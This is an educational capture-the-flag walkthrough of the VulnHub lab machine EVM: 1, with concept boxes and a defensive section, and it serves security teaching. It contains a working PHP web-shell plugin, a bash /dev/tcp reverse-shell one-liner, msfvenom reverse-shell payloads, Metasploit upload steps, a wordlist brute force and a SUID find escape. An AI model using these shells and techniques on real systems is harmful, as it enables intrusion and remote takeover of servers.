# EVM: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students. This machine is **deliberately vulnerable** and must only ever be run on an isolated, host-only network (VirtualBox Host-Only or a private lab VLAN). Never expose it to the internet.

| Field | Value |
| --- | --- |
| **Machine** | EVM: 1 |
| **Difficulty** | **3 — Easy** (stated: *Easy*) |
| **Author** | Ic0de |
| **Released** | 2 Nov 2019 |
| **VulnHub Entry** | [Open on VulnHub](https://vulnhub.com/entry/evm-1,391/) |
| **Download** | [Download OVA](https://vulnhub.com/entry/evm-1,391/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu — Apache + WordPress) |

Throughout this walkthrough the target is always `192.168.56.101` and the attacker (Kali) is `192.168.56.10`. Substitute your own values.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

By the end of this lab you will have practiced the full beginner kill-chain:

- **Host discovery** — finding the target's IP on your lab network (`ip a`, `arp-scan`, `nmap -sn`).
- **Port & service enumeration** — full TCP scan with `nmap -sC -sV -p-`.
- **Web reconnaissance** — spotting an HTML comment that leaks a hidden path.
- **WordPress enumeration** — using `wpscan` to enumerate users *and* brute-force a password.
- **Foothold via a legitimate admin feature** — uploading a malicious plugin as an admin.
- **Post-exploitation** — hunting for secrets left in a home directory.
- **Password-based privilege escalation** — finding a cleartext root password and using `su`.
- **(Alternate) Linux privesc** — checking for a SUID binary and abusing it via [GTFOBins](https://gtfobins.github.io/).

> **Why this matters:** this box is a compressed lesson in why *weak WordPress credentials* are so dangerous. Once you are an admin, WordPress, by design, lets you run code on the server.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and [`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA.

---

## 1. Reconnaissance — finding the target

First, confirm your own network interface and IP address.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists your interfaces and their addresses. You need to know your subnet (`192.168.56.0/24`) so you can scan the right range for the target.

Now sweep the subnet to find live hosts.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10    08:00:27:aa:bb:cc   PCS Systemtechnik GmbH
192.168.56.101   08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 192.168.56.10    1    08:00:27:aa:bb:cc   1   100  Kali Linux
 192.168.56.101   1    08:00:27:dd:ee:ff   1   105  (unknown)
```

> **Why it works:** the target answers ARP (same layer-2 network) or ICMP echo requests, confirming it is alive. The `08:00:27` MAC prefix is VirtualBox's default vendor — a strong hint the host is a VM.

**Target confirmed: `192.168.56.101`.**

![Host discovery output](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Port and service scan


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -sC -sV -p- 192.168.56.101
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.x (Ubuntu)
53/tcp  open  domain      ISC BIND 9.x
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.x
|_http-title: Apache2 Ubuntu Default Page: It works
```

| Flag | Meaning |
| --- | --- |
| `-sC` | Run the default Nmap NSE scripts. |
| `-sV` | Probe open ports to detect service & version. |
| `-p-` | Scan **all 65,535** TCP ports, not just the top 1000. |

> **Why it works:** there are many open ports (mail, SMB, DNS) but the Apache default page on **port 80** is the most promising. The others may be decoys or need credentials; the web server is where beginners will find the way in. (Exact port lists vary slightly by build — always trust your own scan.)

![nmap service scan](images/02-nmap.png)

### 2.2 Web enumeration — the leaked path

Open `http://192.168.56.101`. You get the default Apache "It works!" page. **View the source** — there is a comment left by the author:

```bash
curl -s http://192.168.56.101/ | grep -i -A1 "find me"
```

```html
<!-- you can find me at /wordpress/ im vulnerable :) -->
```

> **Why it works:** developers leave comments in HTML all the time. They are invisible in the rendered page but plain to see with "view source" (Ctrl+U) or `curl`. This one literally tells us where to go next: **`/wordpress/`**.

![The Apache default page and its comment](images/03-web-comment.png)

Confirm the directory and enumerate it:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/wordpress/ (CODE:301|SIZE:0)
```

Browse `http://192.168.56.101/wordpress/` — it is a WordPress site. Now use `wpscan` to enumerate **users**, **themes** and **plugins**:


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url http://192.168.56.101/wordpress/ -e u,at,ap
```

```text
[+] URL: http://192.168.56.101/wordpress/ [192.168.56.101]
[+] WordPress version 5.x identified
[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] c0rrupt3d_brain
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

> **Why it works:** WordPress exposes author information through `/?author=1` URLs and the REST API, and `wpscan` turns that into a user list. We now have a valid username: **`c0rrupt3d_brain`**. (Some builds also expose this name on the site itself.)

### 2.3 Brute-force the WordPress password

With a valid username, try a dictionary attack against the login. WordPress uses `rockyou.txt`-style passwords far too often.


> ### 📖 Concept — Where do wordlists come from?
>
> **`rockyou.txt`** is not a theoretical list. In 2009 the social-networking site
> RockYou was breached; they had stored **32 million passwords in plaintext** — no
> hashing at all. The dump became the most-used password list in security precisely
> because it records what real people actually chose. It has 14,344,392 entries,
> **ordered by observed frequency**, so the top of the file is disproportionately
> valuable. On Kali it ships gzipped:
>
> ```bash
> sudo gzip -dc /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
> wc -l rockyou.txt      # 14344392
> ```
>
> **But a generic list fails against a themed box** — and that is where a *targeted*
> list wins:
>
> ```bash
> cewl -d 2 -m 4 --with-numbers -e -w custom.txt http://target/   # crawl the site, harvest ITS words
> python3 cupp.py -i                                             # build from a person's name, birthday, pet
> crunch 6 6 -t for%%% -o dict.txt                               # generate from a known pattern
> ```
>
> **`cewl` on a themed box is close to magic.** Authors pick passwords that fit their
> theme and then scatter theme words all over the website. `cewl` harvests exactly
> that vocabulary. If a box is called "Narak" and its homepage is full of Sanskrit
> words about hell, the password is very likely one of them — and very unlikely to be
> in `rockyou.txt`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist)

```bash
wpscan --url http://192.168.56.101/wordpress/ \
  --password-attack wp-login \
  -U c0rrupt3d_brain \
  -P /usr/share/wordlists/rockyou.txt
```

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0rrupt3d_brain / 24992499
[+] Valid Combinations Found:
 | Username: c0rrupt3d_brain, Password: 24992499
```

> **Why it works:** WordPress login returns *different* responses for a bad username versus a bad password, which turns the form into a username oracle. Once the username is known, an offline wordlist (rockyou) quickly finds the weak password **`24992499`**.

> **Note:** `-P` (password file) was the old `wpscan` flag. On newer versions it is `--passwords` / `--password-attack`; use `wpscan --help` if a flag is rejected. The chain is the same.

![wpscan user enumeration and brute force](images/04-wpscan.png)

---

## 3. Foothold

### 3.1 Log in as WordPress administrator

Browse to `http://192.168.56.101/wordpress/wp-login.php` and log in:

- Username: `c0rrupt3d_brain`
- Password: `24992499`

`c0rrupt3d_brain` has **Administrator** rights. That is game over for a default WordPress install: admins can install plugins and edit theme files, both of which execute PHP on the server.

![WordPress admin login succeeds](images/05-wp-admin-login.png)

### 3.2 Get a reverse shell (two ways)

**Option A — automatic (Metasploit).** Metasploit ships a module that logs in and uploads a malicious plugin for you:


> ### 📖 Concept — What Metasploit is doing for you
>
> **Metasploit** is a framework of pre-written exploits, payloads and auxiliary
> modules. It automates the *mechanics* — building the request, catching the
> connection, giving you a session — but it does not replace understanding the
> vulnerability.
>
> ```bash
> sudo msfdb init            # first run only — initialises the Postgres database
> msfconsole -q              # -q: skip the banner
> ```
>
> ```text
> msf6 > search <term>              # find modules
> msf6 > use exploit/unix/webapp/…
> msf6 > info                       # READ THIS — describes options and caveats
> msf6 > show options               # what must be set?
> msf6 > set RHOSTS 192.168.56.101  # the TARGET
> msf6 > set LHOST 192.168.56.10    # YOUR ip, on the LAB interface
> msf6 > set TARGETURI /wordpress   # subdirectory the app lives in
> msf6 > show payloads              # what can I pair with this?
> msf6 > exploit
> ```
>
> > **`LHOST` and `TARGETURI` are the two options people get wrong most often.**
> > `LHOST` must be your IP **on the lab interface** — not `127.0.0.1`, not your NAT
> > address. Check with `ip -br a`. `TARGETURI` must include any subdirectory the app
> > lives in (`/wordpress`, `/joomla`, `/webdav`); get it wrong and you get
> > unexplained 404s.
>
> **Sessions:** `sessions -l` list · `sessions -i 1` interact · `sessions -u 1`
> upgrade a dumb shell to Meterpreter · `meterpreter > shell` drop back to a plain
> system shell. Useful Meterpreter commands: `sysinfo`, `getuid`, `ps`, `download`,
> `upload`, `hashdump`.
>
> **`msfvenom`** generates standalone payloads:
>
> ```bash
> msfvenom -p php/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f raw > shell.php
> msfvenom -p linux/x64/shell_reverse_tcp LHOST=… LPORT=… -f elf > shell.elf
> ```
>
> > **Prefer doing it manually at least once per technique.** A Metasploit module
> > hides the actual HTTP request or memory layout from you. Build the exploit by hand
> > first, then use the module to check your understanding — not instead of it.
>
> **Deep dive:** [CONCEPTS §11.3 — Metasploit](../../docs/CONCEPTS.md#113-metasploit)

```bash
msfconsole -q
```

```text
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(...) > set RHOSTS 192.168.56.101
msf6 exploit(...) > set TARGETURI /wordpress
msf6 exploit(...) > set USERNAME c0rrupt3d_brain
msf6 exploit(...) > set PASSWORD 24992499
msf6 exploit(...) > set LHOST 192.168.56.10
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > run
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.101:53xxx)
```

> **Why it works:** the module authenticates as the admin, then uses WordPress's own **plugin upload** feature to place a PHP payload on disk and executes it. No software bug is needed — being an admin *is* the vulnerability. This is exactly the "file-upload / RCE plugin" risk you will hear about.

**Option B — manual (no Metasploit).** Write a tiny plugin that is a web shell, zip it, and upload it via **Plugins → Add New → Upload Plugin**:

```php
<?php
/*
Plugin Name: shell
*/
if (isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
```

```bash
zip shell.zip shell.php
```

After activation, run commands through it:

```bash
curl "http://192.168.56.101/wordpress/wp-content/plugins/shell/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then swap `cmd=id` for a reverse-shell one-liner (e.g. `bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'`) after starting `nc -lvnp 4444` on Kali. Alternatively, as in other WordPress boxes, edit a theme PHP file under **Appearance → Editor** and load it via a 404 request.

> **Why it works:** both routes run attacker-controlled PHP as the web user (`www-data`). Upgrade the shell to a full TTY:


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then Ctrl+Z, run: stty raw -echo; fg  ; and: export TERM=xterm
```

![Reverse shell as www-data](images/06-shell.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 Find the root password left on disk

Enumerate the home directories — always one of the first things to do after a shell.

```bash
cd /home
ls -la
cd root3r        # (some builds: /home/root3r)
ls -la
cat .root_password_ssh.txt
```

```text
willy26
```

> **Why it works:** a user on the box left the **root password in cleartext** inside a hidden file (`.` prefix means hidden; `ls -la` shows hidden files). This is a brutal but very common real-world finding — secrets stored in files on the system. `www-data` can read it because the file permissions allow it.

### 4.2 Switch to root

```bash
su root
# password: willy26
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> **Why it works:** the password we found *is* root's password. `su` switches user; with the correct password we land in a root shell. No exploit needed.

### 4.3 The root flag

```bash
cd /root
ls -la
cat /root/proof.txt
```

```text
<the root proof / flag for this box>
```

**Root flag captured.** The root proof lives in `/root/proof.txt` (the exact filename and contents are set by the released image — check `ls -la /root` and name the file you find; some builds use `flag.txt`).

![Cleartext root password and root shell](images/07-privesc.png)

### Alternate privesc path (varies by build)

Some builds of EVM also ship a **SUID `find`** binary, which gives root without needing the password:


> ### 📖 Concept — What is SUID?
>
> **SUID** (*set-user-ID*) is a file permission bit that makes a program run with the
> privileges of the **file's owner** rather than the caller. It exists for a good
> reason: `/usr/bin/passwd` is SUID-root so ordinary users can change their own
> password, which requires writing `/etc/shadow` — a file they cannot otherwise touch.
>
> **When a *powerful* binary carries the SUID bit, that power becomes yours.** In a
> listing you read it as an **`s`** where the owner's execute bit would be:
>
> ```text
> -rwxr-xr-x  →  -rwsr-xr-x        (SUID set)
>       ^            ^
> ```
>
> ```bash
> find / -perm -u=s -type f 2>/dev/null      # the human-readable form
> find / -perm -4000 -type f 2>/dev/null     # octal equivalent
> find / -perm /6000 -type f 2>/dev/null     # SUID *or* SGID
> ```
>
> `-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset*
> match, so it also catches SGID files). `-type f` restricts to regular files.
> `2>/dev/null` discards the thousands of `Permission denied` errors that would
> otherwise bury the answer.
>
> **Compare against the stock baseline** so the odd entries jump out. Normal on
> Debian/Ubuntu: `mount`, `umount`, `su`, `ping`, `passwd`, `chfn`, `chsh`, `newgrp`,
> `gpasswd`, `ssh-keysign`, `pppd`, `dmcrypt-get-device`, `traceroute6.iputils`.
>
> **Never normal, and an instant root if found:** `cp`, `mv`, `wget`, `curl`, `tar`,
> `find`, `vim`, `nano`, `less`, `more`, `man`, `python`, `perl`, `php`, `ruby`,
> `awk`, `sed`, `env`, `bash`, `sh`, `gdb`, `nmap`, `tcpdump`, `dd`, `make`, `git`,
> `tail`, `head`, `cat`, `rsync`, `apt`.
>
> Look each one up on **[GTFOBins](https://gtfobins.github.io/)** → its **SUID**
> section. Note that spawning a shell from a SUID binary usually needs **`-p`**
> (*privileged*) — without it, `bash` deliberately drops its effective UID back to
> yours as a safety measure, and you end up exactly where you started.
>
> **Deep dive:** [CONCEPTS §15.3 — SUID binaries](../../docs/CONCEPTS.md#153-suid-binaries)

```bash
find / -perm -4000 -type f 2>/dev/null | grep find
find . -exec /bin/sh -p \; -quit
```

> **Why it works:** a SUID-root `find` runs its `-exec` command as root. `-p` makes the shell preserve that privilege. See [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/). Whether this path exists depends on the build, so always run the SUID check yourself.

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Information disclosure via HTML comment | `http://<IP>/` source | Leaks the `/wordpress/` path |
| 2 | Username enumeration | WordPress REST/author routes | Reveals user `c0rrupt3d_brain` |
| 3 | Weak WordPress administrator password | `wp-login.php` | Full CMS admin access (`24992499`) |
| 4 | Server-side code execution by design | Plugin upload / theme editor | Reverse shell as `www-data` |
| 5 | Cleartext secret on disk | `/home/root3r/.root_password_ssh.txt` | Root password disclosed (`willy26`) |
| 6 | (Some builds) SUID root binary | `/usr/bin/find` | Local root shell via `-exec` |

---

## 6. Defensive lessons (blue team)

- **Remove developer comments** from production HTML. Review template output for comments that leak paths or internal notes.
- **Enforce strong admin credentials** and add rate limiting, lockouts and MFA to `wp-login.php`. Weak passwords like `24992499` fall instantly to `rockyou.txt`.
- **Return generic login errors** so attackers cannot tell a valid username from an invalid password.
- **Restrict who can install plugins / edit themes.** Set `define('DISALLOW_FILE_EDIT', true);` and `define('DISALLOW_FILE_MODS', true);` in `wp-config.php`, and grant the `install_plugins` capability only where absolutely required.
- **Never store secrets in files on disk**, especially not in cleartext, and never in world- or web-readable locations. Use a secret manager and restrict file permissions.
- **Never reuse or write down the root password.** Prefer `sudo` with per-command rules over sharing the root password.
- **Audit SUID/SGID binaries** regularly (`find / -perm -4000 -type f`) and cross-check against [GTFOBins](https://gtfobins.github.io/).
- **Keep WordPress core, themes and plugins patched**, and monitor file integrity of `wp-content/`.
- **Segment and isolate lab machines.** This box must never touch a production or internet-facing network.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- EVM: 1 on VulnHub — https://vulnhub.com/entry/evm-1,391/
- Hacking Articles — "EVM: 1 Vulnhub Walkthrough" — https://www.hackingarticles.in/evm-1-vulnhub-walkthrough/
- FrostyLabs — "VulnHub: EVM-1" — https://frostylabs.net/posts/Vulnhub-evm1
- WPScan user documentation — https://github.com/wpscanteam/wpscan/wiki/WPScan-User-Documentation
- Metasploit — `wp_admin_shell_upload` — https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
- GTFOBins — `find` — https://gtfobins.github.io/gtfobins/find/
- WordPress hardening — https://developer.wordpress.org/advanced-administration/security/hardening/

---

## 8. Screenshot checklist

When you reproduce this lab, capture and save the following images to `images/`:

- [ ] `images/01-recon.png` — `ip a` / `arp-scan` / `nmap -sn` showing the target IP.
- [ ] `images/02-nmap.png` — the full `nmap -sC -sV -p-` scan.
- [ ] `images/03-web-comment.png` — the Apache page and the `you can find me at /wordpress/` comment.
- [ ] `images/04-wpscan.png` — `wpscan` user enumeration and the `c0rrupt3d_brain : 24992499` brute force.
- [ ] `images/05-wp-admin-login.png` — successful WordPress administrator login.
- [ ] `images/06-shell.png` — the plugin upload / Metasploit shell as `www-data`.
- [ ] `images/07-privesc.png` — `.root_password_ssh.txt` (`willy26`), `su root`, and `/root/proof.txt`.
- [ ] `images/08-recap.png` — the full chain summarised for the final report.

---

_Full exploitation chain: HTML comment → `/wordpress/` → `wpscan` user enum (`c0rrupt3d_brain`) → `wp-login` brute force (`24992499`) → admin plugin upload / Metasploit `wp_admin_shell_upload` → shell as `www-data` → `/home/root3r/.root_password_ssh.txt` (`willy26`) → `su root` → `/root/proof.txt`._

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
